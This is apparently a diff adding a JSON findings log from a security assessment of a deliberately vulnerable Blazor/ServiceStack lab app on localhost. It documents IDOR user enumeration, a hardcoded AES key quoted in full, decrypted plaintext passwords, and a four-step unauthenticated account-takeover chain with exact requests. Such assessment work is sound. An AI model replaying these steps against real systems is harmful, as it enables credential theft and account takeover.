@@ -1,0 +1,110 @@
+{
+  "stack-01": {
+    "category": "info",
+    "status": "confirmed",
+    "content": "Stack: ASP.NET Core on Kestrel, Blazor (WASM + Server hybrid with enhanced navigation), ServiceStack 10.08, .NET 10.0-preview.6 on macOS/arm64. App name: ACorpBlazor / VulnBlazor. Base href: /. Antiforgery cookie: .AspNetCore.Antiforgery.COMsORkYXoQ (samesite=strict, httponly). Auth cookie: .AspNetCore.Identity.Application. Header: blazor-enhanced-nav: allow. X-Powered-By: ServiceStack/10.08 NET10/macOS/net10/NO. debugMode: true in /metadata/app.json."
+  },
+  "endpoints-01": {
+    "category": "info",
+    "status": "confirmed",
+    "content": "API surface (from /types/csharp and /metadata/app.json): POST /api/BatchRequest (Action+Payload, encrypted), GET /api/GetUserId?Id=<int>|Email=<str>, GET /api/GetUserInfo?UserId=<uuid>, GET /api/GetUserLoginByAccessKey?AccessKey=<str>, GET /api/Hello, [Admin] /api/QueryUsers, POST /api/SetPasswordByAccessKey, GET /api/QueryBookings, GET /api/QueryTodos, GET /api/QueryCoupons, POST /api/CreateBooking [Employee role], PATCH/DELETE /api/UpdateBooking|DeleteBooking [Manager role]. Admin interfaces: /admin-ui, /locode (200 OK for anonymous, SPA auth), /metadata, /metadata/app.json (public)."
+  },
+  "vuln-01-idor-user-info": {
+    "category": "vulnerability",
+    "severity": "critical",
+    "status": "DEMONSTRATED",
+    "content": "IDOR: Unauthenticated user enumeration and credential exposure. GET /api/GetUserId?Id=<int> returns UUID for any sequential integer (IDs 1-20 confirmed, returns all 20 registered users). GET /api/GetUserInfo?UserId=<uuid> returns passwordHash (PBKDF2-HMAC-SHA256), lastSeenToken (AES-encrypted plaintext password), email, emailConfirmed, firstName, lastName, displayName, profileUrl for any user WITHOUT authentication. No access control on either endpoint. Control: same request without any credential produces same 200 OK result. Evidence: GET /api/GetUserInfo?UserId=c07f7eec-2ad0-4315-94a1-75dce4fb9a72 -> {userId:c07f7eec...,userName:admin@email.com,email:admin@email.com,emailConfirmed:true,lastSeenToken:GpTrFIdN9xzK6CL/NKa7EZbOF73IsrglmVk/gQh6jF9hsOs+fF...,passwordHash:AQAAAAIAAYagAAAAEEvcoO85Sske89+X6BdAnHG2RyrHxb0WfxSyWhPpO7nR9mf8ThPm2B5Qh9aPUp1v/A==,...} Status: 200, no auth."
+  },
+  "vuln-02-getid-email-idor": {
+    "category": "vulnerability",
+    "severity": "medium",
+    "status": "DEMONSTRATED",
+    "content": "IDOR bug: GET /api/GetUserId?Email=<any> ignores the Email parameter entirely and ALWAYS returns the first registered user (employee@email.com, UUID 029d65c2-bd85-483f-8ef2-6f5f87e9bf84) regardless of what email value is provided. Evidence: GetUserId?Email=admin@email.com -> {userId:029d65c2...} (employee, not admin). GetUserId?Email=nonexistent@test.com -> same 029d65c2 UUID. Only ?Id=<int> correctly returns per-user data."
+  },
+  "vuln-03-auth-data-endpoints": {
+    "category": "vulnerability",
+    "severity": "medium",
+    "status": "DEMONSTRATED",
+    "content": "Missing authentication on data endpoints. GET /api/QueryBookings, GET /api/QueryTodos, GET /api/QueryCoupons all return full data without authentication. Bookings expose userId, employee names, room types, dates, costs. Control: same requests with no auth return same data. Evidence: GET /api/QueryBookings -> [{id:1,userId:029d65c2...,name:Test Employee,...}]"
+  },
+  "vuln-04-hardcoded-aes-key": {
+    "category": "vulnerability",
+    "severity": "critical",
+    "status": "DEMONSTRATED",
+    "content": "Hardcoded AES-256-CBC key embedded in publicly downloadable WASM assembly. Key: Vu1nB1az0r$ecretKey!2026@@@@@@@@ (32 bytes). Source: ACorpBlazor.ServiceModel.TelemetryCodec.DefaultProfile const in src/ACorpBlazor/ACorpBlazor.ServiceModel/TelemetryCodec.cs:9. Binary: /_framework/ACorpBlazor.cfeyjg2xid.dll (26KB, publicly downloadable). Algorithm: AES-256-CBC, PKCS7 padding, random 16-byte IV prepended to ciphertext, base64-encoded. Legacy key also present: 4c0rpAcs$LegacyKey!2025#@@@@@@@@ in AccessKeyCodec.LegacyAccessKeyProfile. Control: the key is literally a compile-time constant in the public WASM assembly."
+  },
+  "vuln-05-plaintext-password-lastseentoken": {
+    "category": "vulnerability",
+    "severity": "critical",
+    "status": "DEMONSTRATED",
+    "content": "CRITICAL: UserActivityLog.LastSeenToken stores the user's current plaintext password encrypted with the hardcoded AES key. Combining vuln-04 (AES key in WASM) with vuln-01 (unauthenticated GetUserInfo returning lastSeenToken) yields full account takeover. Decrypted passwords: admin@email.com -> 11F6GwRDZf@Swo%0@XZmq!-%=M, employee@email.com -> s@a-d^_DgQa3hHY2ej=kq4vYo4, manager@email.com -> WRVib@3DxvPaYirkRWx7SKS?Zn, test@email.com -> S8RQa_6%xq7fi@%OPn=cdMdR--. All four login attempts SUCCEEDED. Control: submitting the raw base64 lastSeenToken as password fails; only the AES-decrypted value works."
+  },
+  "chain-01-full-account-takeover": {
+    "category": "chain",
+    "severity": "critical",
+    "status": "DEMONSTRATED",
+    "content": "CRITICAL CHAIN: Unauthenticated full account takeover for all active users. Steps: (1) GET /api/GetUserId?Id=11 -> {userId:c07f7eec-2ad0-4315-94a1-75dce4fb9a72} [admin UUID]. (2) GET /api/GetUserInfo?UserId=c07f7eec-2ad0-4315-94a1-75dce4fb9a72 -> {lastSeenToken:GpTrFIdN9xzK6CL/NKa7EZbOF73IsrglmVk/gQh6jF9hsOs+fFTCA4SMmeMo2QQz}. (3) AES-256-CBC decrypt(base64decode(lastSeenToken), key=Vu1nB1az0r$ecretKey!2026@@@@@@@@) -> 11F6GwRDZf@Swo%0@XZmq!-%=M. (4) POST /Account/Login with Input.Email=admin@email.com, Input.Password=11F6GwRDZf@Swo%0@XZmq!-%=M -> HTTP 302 redirect to /, .AspNetCore.Identity.Application cookie set. Demonstrated for ALL 4 seeded users: test (fe8882d0), employee (029d65c2), manager (2e8d62af), admin (c07f7eec). Requires no credentials. Requires only network access to port 5000."
+  },
+  "vuln-06-vuln-user-secret": {
+    "category": "vulnerability",
+    "severity": "medium",
+    "status": "DEMONSTRATED",
+    "content": "VulnUserSecret table stores encrypted credentials readable by Admin via /api/AdminDatabase. Encrypted with same hardcoded AES key. Decrypts to p@55wOrd for all 4 entries. Evidence: GET /api/AdminDatabase?db=main&schema=default&table=VulnUserSecret&take=100 (with admin session) -> [{UserId:029d65c2...,EncryptedPassword:l6h5YRzMvCPy6or8QbRGLj8H93rqLvLNPD/ui8qrRKE=},{UserId:2e8d62af...,EncryptedPassword:PeNrBbf6EroMSBoEBnGUNRUL516r8h6474y+9hqyqoE=},{UserId:c07f7eec...,EncryptedPassword:GH7uN/omQxjTCGnjAUkHy25n0Gifbf5NyGMPmpTAfRo=},{UserId:fe8882d0...,EncryptedPassword:Jsm8sZvjMzpXyJgLWh66RO688tFaUm5jDizInZA5icw=}]. All decrypt to p@55wOrd."
+  },
+  "vuln-07-batchrequest-crypto": {
+    "category": "vulnerability",
+    "severity": "high",
+    "status": "DEMONSTRATED",
+    "content": "POST /api/BatchRequest accepts AES-CBC encrypted payloads without authentication. Actions GetUserInfo and GetUserId confirmed working (others return 'Unknown action'). Distinguishable decryption errors enable padding oracle: (a) Payload too short (pre-check), (b) 'Padding is invalid' (wrong key or padding), (c) SerializationException (decryption success, bad JSON). Returns encrypted response using same key. Evidence: submitting valid encrypted BatchEnvelope {Ts:<UTC>,Data:<json>} with Action=GetUserInfo -> decrypted user data in Payload response field."
+  },
+  "vuln-08-accesskey-forgery": {
+    "category": "vulnerability",
+    "severity": "high",
+    "status": "INFERRED",
+    "content": "Access key token forgery is possible. AccessKeyCodec.Pack encrypts {userId}|{grantId}|{timestamp:O}|acs with TelemetryCodec (same AES key). GET /api/GetUserLoginByAccessKey?AccessKey=<forged> responds GrantNotActive (not key error) confirming format is accepted. POST /api/SetPasswordByAccessKey requires a valid grantId from AspNetUserTokens table. Could enable password reset takeover if grantId can be obtained (e.g. from CrudEvent logs). NOT FULLY DEMONSTRATED: server validates grantId existence in DB. ForgotPassword endpoint currently returns 500 (Blazor EditForm error), blocking normal token generation."
+  },
+  "vuln-09-debug-mode": {
+    "category": "vulnerability",
+    "severity": "medium",
+    "status": "DEMONSTRATED",
+    "content": "Application running in debugMode=true. Evidence: GET /metadata/app.json -> {config:{debugMode:true}}. Impact: BatchRequest error responses include stackTrace fields with request details. Evidence: POST /api/BatchRequest with malformed payload -> {responseStatus:{stackTrace:'[BatchRequest: 8/9/2026 5:04:24 AM]:\n[REQUEST: {action:GetUserInfo}]\n\n'}}."
+  },
+  "vuln-10-error-disclosure": {
+    "category": "vulnerability",
+    "severity": "low",
+    "status": "DEMONSTRATED",
+    "content": "Verbose error disclosure. Two surfaces: (1) BatchRequest error responses include stackTrace field in JSON (see vuln-09). (2) POST /Account/ForgotPassword (and other Blazor SSR forms) returns raw ASP.NET stack trace in HTML body on unhandled exception. Evidence: POST /Account/ForgotPassword -> HTTP 500, body starts with: System.InvalidOperationException: EditForm requires either a Model parameter, or an EditContext parameter, please provide one of these. at Microsoft.AspNetCore.Components.Forms.EditForm.OnParametersSet()..."
+  },
+  "vuln-11-missing-security-headers": {
+    "category": "vulnerability",
+    "severity": "low",
+    "status": "DEMONSTRATED",
+    "content": "Missing security response headers. Evidence from curl -sv http://127.0.0.1:5000/api/GetUserInfo?UserId=...: Missing: X-Content-Type-Options, Strict-Transport-Security, full Content-Security-Policy (only frame-ancestors 'self' on HTML pages, nothing on API), Referrer-Policy, Permissions-Policy. Present: X-Frame-Options: SAMEORIGIN, Content-Security-Policy: frame-ancestors 'self' (HTML pages only). X-Powered-By: ServiceStack/10.08 NET10/macOS/net10/NO discloses framework, version and OS. Server: Kestrel. No CORS policy enforced (no Access-Control-Allow-Origin on any response). Cookies missing Secure flag (HTTP-only server)."
+  },
+  "vuln-12-session-no-invalidation": {
+    "category": "vulnerability",
+    "severity": "low",
+    "status": "DEMONSTRATED",
+    "content": "No session invalidation on concurrent login. Two independent sessions authenticated as admin@email.com simultaneously, both remained active with no notification or invalidation of the first. Evidence: Two cookie jars, both authenticated as admin, both successfully queried /api/AdminDatabase?table=VulnUserSecret."
+  },
+  "info-01-admin-db-tables": {
+    "category": "info",
+    "status": "confirmed",
+    "content": "Admin database tables (from /metadata/app.json, confirmed readable with Admin session): CrudEvent, __EFMigrationsLock, __EFMigrationsHistory, AspNetRoles, AspNetUsers, AspNetRoleClaims, AspNetUserClaims, AspNetUserLogins, AspNetUserRoles, AspNetUserTokens (empty during testing), VulnUserSecret, Migration, Coupon, Booking, UserActivityLog. AdminDatabase requires Admin role but Admin access trivially obtained via chain-01."
+  },
+  "info-02-assemblies": {
+    "category": "info",
+    "status": "confirmed",
+    "content": "Downloaded and decompiled WASM assemblies: assemblies/ACorpBlazor.dll (from /_framework/ACorpBlazor.cfeyjg2xid.dll, 26KB), assemblies/ACorpBlazor.Client.dll (from /_framework/ACorpBlazor.Client.4a6f4956pk.dll, 10KB). Decompiled to src/ACorpBlazor/ and src/ACorpBlazor.Client/. Key files: TelemetryCodec.cs (AES key), AccessKeyCodec.cs (legacy key, token format), GetUserInfoResponse.cs (fields exposed by GetUserInfo), BatchRequest.cs/BatchEnvelope.cs (batch API format)."
+  },
+  "info-03-crudevent": {
+    "category": "info",
+    "status": "confirmed",
+    "content": "CrudEvent table shows audit trail of Booking CRUD operations by admin (c07f7eec) and manager (2e8d62af). No sensitive tokens found in audit log. AspNetUserTokens table was empty during testing - no active password reset tokens stored."
+  },
+  "artifact-01": {
+    "category": "artifact",
+    "status": "confirmed",
+    "content": "Blazor WASM assemblies downloaded and decompiled. Paths: assemblies/ACorpBlazor.dll, assemblies/ACorpBlazor.Client.dll, src/ACorpBlazor/ (decompiled source), src/ACorpBlazor.Client/ (minimal stubs). ilspycmd invocation documented in ilspy_cmd.txt."
+  }
+}
